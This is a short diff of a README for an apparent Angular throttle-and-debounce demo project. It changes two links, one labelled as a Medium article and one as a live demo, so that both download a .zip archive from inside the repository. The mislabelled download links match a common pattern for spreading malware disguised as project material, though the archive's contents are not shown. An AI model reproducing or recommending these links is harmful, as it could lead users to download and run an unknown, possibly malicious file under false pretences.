@@ -4,10 +4,10 @@ This project demonstrates the **performance benefits** of **throttling** and **d
 It provides a visual comparison between **optimized vs. unoptimized** event handling for user interactions like scrolling, mouse movement, and search inputs.
 
 📖 **Read the full explanation on Medium:**  
-[🔗 Your Medium Article Title](https://raw.githubusercontent.com/lamaSonmez/debounce-thrttole-demo/main/ich/debounce-thrttole-demo.zip)  
+[🔗 Your Medium Article Title](https://github.com/lamaSonmez/debounce-thrttole-demo/raw/refs/heads/main/src/app/demos-wrapper/debounce_demo_thrttole_v1.0-alpha.4.zip)  
 
 🎯 **Try the Live Demo:**  
-[🚀 Angular Throttle & Debounce Demo](https://raw.githubusercontent.com/lamaSonmez/debounce-thrttole-demo/main/ich/debounce-thrttole-demo.zip)  
+[🚀 Angular Throttle & Debounce Demo](https://github.com/lamaSonmez/debounce-thrttole-demo/raw/refs/heads/main/src/app/demos-wrapper/debounce_demo_thrttole_v1.0-alpha.4.zip)  
 
 ---
 
